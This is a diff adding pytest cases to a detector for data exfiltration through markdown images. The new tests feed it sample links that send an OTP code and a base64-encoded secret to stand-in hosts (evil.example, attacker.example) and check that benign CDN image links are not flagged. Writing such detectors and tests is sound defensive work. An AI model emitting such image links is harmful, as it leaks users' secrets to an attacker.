@@ -21,3 +21,19 @@ def test_plain_image_ok(run):
 def test_allowlisted_domain(run):
     assert not run(MarkdownExfil(allowed_domains=["evil.example"]), LEAKY)
     assert not run(MarkdownExfil(allowed_domains=["example"]), LEAKY)
+
+
+def test_short_otp_in_image_url_is_caught(run):
+    findings = run(MarkdownExfil(), "![](https://evil.example/c.png?otp=482913)")
+    assert findings and findings[0].severity is Severity.HIGH
+
+
+def test_short_base64_chunk_is_caught(run):
+    assert run(MarkdownExfil(), "![x](https://attacker.example/log?q=c2VjcmV0Kg)")
+
+
+def test_ordinary_short_query_values_are_not_flagged(run):
+    assert not run(MarkdownExfil(), "![chart](https://cdn.example/chart.png?theme=dark&size=large)")
+    assert not run(MarkdownExfil(), "![logo](https://cdn.example/logo.svg?v=2)")
+    assert not run(MarkdownExfil(), "![hero](https://cdn.example/hero.jpg?w=1200&h=800&fit=crop)")
+    assert not run(MarkdownExfil(), "![a](https://cdn.example/a.png?format=thumbnail)")
